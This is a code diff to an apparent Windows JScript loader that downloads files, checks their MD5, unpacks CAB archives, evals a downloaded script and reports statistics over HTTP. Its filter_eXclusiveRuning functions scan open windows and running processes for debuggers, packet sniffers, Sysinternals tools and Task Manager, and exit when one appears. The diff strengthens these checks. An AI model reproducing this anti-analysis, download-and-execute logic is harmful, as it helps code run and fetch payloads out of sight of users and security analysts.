@@ -96,11 +96,13 @@ function module(name,g){
 				return true;
 			}else if (this.currentFilterIndex>=this.filters.length) {
 				//////////////
-				log("module name : " + this.name +  " function .travelFilter doneCallback ")
+				log("module name : " + this.name +  " function .travelFilter doneCallback--last one asysn")
 				if (this.doneCallback) {
 					this.doneCallback(this,pipe,this.currentFilterIndex);
 				}
-				if(module.doneCallback && module.getRunningModules().length==0){
+				var len = module.getRunningModules().length
+				log("running module length : " + len);
+				if(module.doneCallback && len==0){					
 					module.doneCallback(module);
 				}
 				return true;
@@ -118,20 +120,21 @@ function module(name,g){
 				log("module name : " + this.name +  " ran filter("+i+") return "+ (ret ? ret.toString() : "undefined") +" , currentpipe.name="+pipe.name.toString());	
 				if(this.currentFilterIndex<0){
 					return;
-				}
-				this.currentFilterIndex=i+1
-				if(!ret)
-				{
+				}				
+				if(!ret){
 					break;
 				}
+				this.currentFilterIndex=i+1
 			}
 			/////////////////////////
 			if(ret){
-				log("module name : " + this.name +  " function .travelFilter doneCallback ")
+				log("module name : " + this.name +  " function .travelFilter doneCallback--last one sysn ")
 				if (this.doneCallback) {
 					this.doneCallback(this,pipe,this.currentFilterIndex);
 				}
-				if(module.doneCallback && module.getRunningModules().length==0){
+				var len = module.getRunningModules().length
+				log("running module length : " + len);
+				if(module.doneCallback && len==0){
 					module.doneCallback(module);
 				}
 				return true;
@@ -139,16 +142,16 @@ function module(name,g){
 			return ret;
 	}
 	this.process_callback=function(pipe, cancel){
-		log("module name : " + pipe.module.name + " this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
+		log("module name : " + pipe.module.name + "enter this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
 		if(cancel && pipe.module.currentFilterIndex<pipe.module.filters.length){
 			pipe.module.cancel();
 			return true;
 		}
 		//////
-		if(pipe.module && pipe.module.currentFilterIndex>0)
-		{
+		if(pipe.module && pipe.module.currentFilterIndex>=0){
+			pipe.module.currentFilterIndex += 1;
 			var ret = pipe.module.travelFilter(pipe);
-			log("module name : " + pipe.module.name + " this.process_callback2 pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
+			log("module name : " + pipe.module.name + "leave this.process_callback pipe.name="+pipe.name+" pipe.module.currentFilterIndex="+pipe.module.currentFilterIndex);
 			return ret;
 		}
 	}///////////////////
@@ -166,13 +169,15 @@ function module.prototype.run(pipe, filterIndex){
 	return this.travelFilter(pipe)
 }
 function module.prototype.cancel () {
-	log("module name : " + this.name +" cancel");
+	log("module name : " + this.name +" cancel, this.currentFilterIndex="+this.currentFilterIndex);
 	var index = this.currentFilterIndex;
 	this.currentFilterIndex=-1;
 	if (this.doneCallback) {
 		this.doneCallback(this,this.pipe,index);
 	}
-	if(module.doneCallback && module.getRunningModules().length==0){
+	var len = module.getRunningModules().length
+	log("running module length : " + len);
+	if(module.doneCallback && len==0){
 		module.doneCallback(module);
 	}
 }
@@ -189,15 +194,15 @@ module.setDoneCallback=function (callback) {
 	log("module.setDoneCallback")
 	module.doneCallback = callback;
 }
-module.getRunningModules=function () {
-	log("module.getRunningModules")
+module.getRunningModules=function () {	
 	var runningModules = []
 	for(var index in module.modules){
 		var _module = module.modules[index];
 		var step = _module.getStep();
-		log("module : " + _module.name + " , in step : " + step + ", filters.length="+_module.filters.length + " _module.g="+_module.g);
-		if((step>0 && (step<_module.filters.length)) //filter未执行完
-				&& !_module.g){
+		var en = (step>=0 && (step<_module.filters.length)) //filter未执行完
+				&& !_module.g
+		log("module : " + _module.name + " , in step : " + step + ", filters.length="+_module.filters.length + " _module.g="+_module.g + " +"+(en?1:0));
+		if(en){
 			runningModules.push(_module);
 		}
 	}
@@ -207,13 +212,11 @@ module.getRunningModules=function () {
 function getXmlHttp () {
 	/////////////
 	if(typeof arguments.callee.objs=="undefined")
-		arguments.callee.objs = [];
-	log("getXmlHttp.objs.length="+arguments.callee.objs.length);
-	 
+		arguments.callee.objs = [];	 
 	for(var index in arguments.callee.objs){
 		var obj = arguments.callee.objs[index];
 		if(obj.readyState==4){
-			log("exist idle xmlhttp, name = "+"getXmlHttp_name_"+arguments.callee.name);
+			log("exist idle xmlhttp, name = "+"getXmlHttp_name_"+arguments.callee.name+" "+"getXmlHttp.objs.length="+arguments.callee.objs.length);
 			//obj.abort();
 			return obj;
 		}
@@ -228,7 +231,7 @@ function getXmlHttp () {
 	var objXmlHttp ;
 	if (arguments.callee.progid) {
 		objXmlHttp = new ActiveXObject(arguments.callee.progid);
-		log("exist progid for xmlhttp : "+arguments.callee.progid);
+		//log("exist progid for xmlhttp : "+arguments.callee.progid);
 	}
 	else{
 		var MSXML = new Array(  'MSXML2.XMLHTTP'
@@ -245,6 +248,7 @@ function getXmlHttp () {
 		}
 	}////
 	arguments.callee.objs.push(objXmlHttp);
+	log("add XmlHttp , getXmlHttp.objs.length="+arguments.callee.objs.length);	
 	///////////
 	return objXmlHttp;
 }
@@ -281,7 +285,7 @@ function filter_dlbusiness.prototype.run(pipe){
 	var pThis = this;
 	pipe.exitcode=100;
 	if(md5==pipe.md5.toUpperCase()){
-		log(" readyDestFile OnSuccess "+pipe.name)
+		log(" readyDestFile OnSuccess "+pipe.name+" , md5="+md5);
 		sendHttpStat("downloadedfile", "downloadedfile_success_"+pipe.name);
 		return true;
 	}
@@ -310,13 +314,11 @@ function filter_dlbusiness.prototype.run(pipe){
 							log(" path md5:"+tmd5+" destmd5:"+pipe.md5)
 							if((__DEBUG && tmd5) || (tmd5 == pipe.md5.toUpperCase()) ){
 								sendHttpStat("downloadingfile", "downloadingfile_success_" +pipe.name);
-								if( pipe.name.substr(pipe.name.length-4)==".cab")
-								{	if(__storage.ExtractCab(__workdir+pipe.name, DIR))
-									{
-										log("extractcab success");
+								if( pipe.name.substr(pipe.name.length-4)==".cab"){
+									if(__storage.ExtractCab(__workdir+pipe.name, __workdir)){
+										log("extractcab success : " + " from " + __workdir+pipe.name+" to " + __workdir);
 									}
-									else
-									{
+									else{
 										sendHttpStat("downloadingfile", "downloadingfile_failed_extractcab_" + pipe.name); 
 									}
 								}
@@ -346,9 +348,8 @@ function filter_loadmainjs() {
 };
 function filter_loadmainjs.prototype.run (pipe) {
 	var pThis = this;
-		setTimeout(function(){evalFile(__workdir+pipe.name);},1)
-		log("evalFile("+ __workdir+pipe.name +")");
-		//pThis.callback(pipe,true) 
+	log("evalFile("+ __workdir+pipe.name +")");
+	setTimeout(function(){evalFile(__workdir+pipe.name);},1)	
 	return true;
 }
 function filter_eXclusiveRuning(once){
@@ -356,8 +357,8 @@ function filter_eXclusiveRuning(once){
 }
 function filter_eXclusiveRuning.prototype.run(pipe){
 	var pThis = this;
-	var ret = __DEBUG ? 0 : external.__debugging || this.checkWindows() || this.checkProcesses();	
-	log("ret="+ret+" ,this.once="+this.once + ", external.__debugging="+external.__debugging);
+	var ret = external.__debugging || this.checkWindows() || this.checkProcesses();	
+	log("ret="+ret+" ,this.once="+this.once + ", external.__debugging="+external.__debugging);	
 	if(this.once){
 		if(ret){
 			pipe.exitaction=unescape(ret.toString());
@@ -367,7 +368,7 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 		return true;
 	}else{
 		setInterval(function (){
-			var ret = __DEBUG ? 0 : external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
+			var ret = external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
 			if(ret){
 				pipe.exitaction=unescape(ret.toString());
 				pThis.callback(pipe,true); 
@@ -376,16 +377,18 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 	}
 }
 function filter_eXclusiveRuning.prototype.checkWindows(){
-	var blacklist=["任务管理器","HTTP Analyzer",
-		"Microsoft Visual","HTTP Analyzer","WinDBG","OllyDebug",
-		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","任务管理器",
-		"Process Explorer", "File Monitor", "Registry Monitor","spy","Wireshark","ollyice",
+	var blacklist=["Microsoft Visual", "HTTP Analyzer", "WinDBG", "OllyDebug",		
+		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","任务管理器","Spy", 
+		"Process Explorer", "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
 		" - Sysinternals:"];
+	if(!__DEBUG)
+		blacklist.push("DebugView")
 	var titile
 	var ret = __windows.EnumWindows(function(hwnd, text){
 		for(var index in blacklist){
 			if(text.indexOf(blacklist[index])>=0){
 				titile = text;
+				log("exist wnd " + text + " will exit() ;")
 				return 0;
 			}
 		}
@@ -396,22 +399,26 @@ function filter_eXclusiveRuning.prototype.checkWindows(){
 function filter_eXclusiveRuning.prototype.checkProcesses(){
 	var blacklist=["wireshark", "fiddler", "httpanalyzer", "smsniff", 
 					"filemon", "regmon", "procmon", "windbg", "procexp","cv.exe",
-					"ollydbg", "softice", "mzurlspy","taskmgr","devenv","msdev","spy","ollyice","Wireshark",
-					"dbgv"];
+					"ollydbg", "softice", "mzurlspy","taskmgr","devenv","msdev","spy","ollyice","Wireshark","dan",
+					"depends"];
 	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
+	if(!__DEBUG)
+		blacklist.push("dbgv")
 	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
 	for (var index in blacklist){
 		var name = blacklist[index];
 		wql += " or Name like '%" + name+"%'";	
 	}
-	log("filter_eXclusiveRuning.prototype.checkProcesses wql="+wql);
+	//log("filter_eXclusiveRuning.prototype.checkProcesses wql="+wql);
 	var process = new Enumerator (__service.ExecQuery(wql)).item();	
 	if(process){
-		log("exist " + process.Name + " will exit() ; wql="+wql)
+		log("exist process " + process.Name + " will exit() ; wql="+wql)
 	}else{
 		
 	}
-	return process ?  process.Name :false;
+	var ret = process ?  process.Name :false;
+	delete process;
+	return ret;
 }
 ////
 function tryInstall(){
@@ -461,8 +468,7 @@ function onload(){
 	////////////
 	var pipe = __destReady;
 	__module.setDoneCallback(function (mod,pipe, index) {		
-		exitaction = pipe.exitaction
-		log(" module name "+mod.name+" onDoneCallback pipe.exitaction="+mod.pipe.exitaction+" pipe.exitcode="+pipe.exitcode+" indexfilter="+index);
+		exitaction = pipe.exitaction		
 		delete filter_xrun; delete filter_dl; delete filter_load; delete filter_xrun2;
 		delete __module;
 		setTimeout(function(){__external.TerminateProcess(0,1); exit(-20)},1);
@@ -470,4 +476,4 @@ function onload(){
 	})
 	__module.run(pipe);
 };
-function onunload(code){ sendHttpStat("launch", "unload_" + code, parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage};
+function onunload(code){ sendHttpStat("launch", "unload_" + (code==-20 ? exitaction:code), parseInt((__external.GetTickCount()-__startTickCout)/1000/60),  1);  delete  __cpu ; delete __service ; delete __locator;  delete __external; delete __windows; delete __storage};
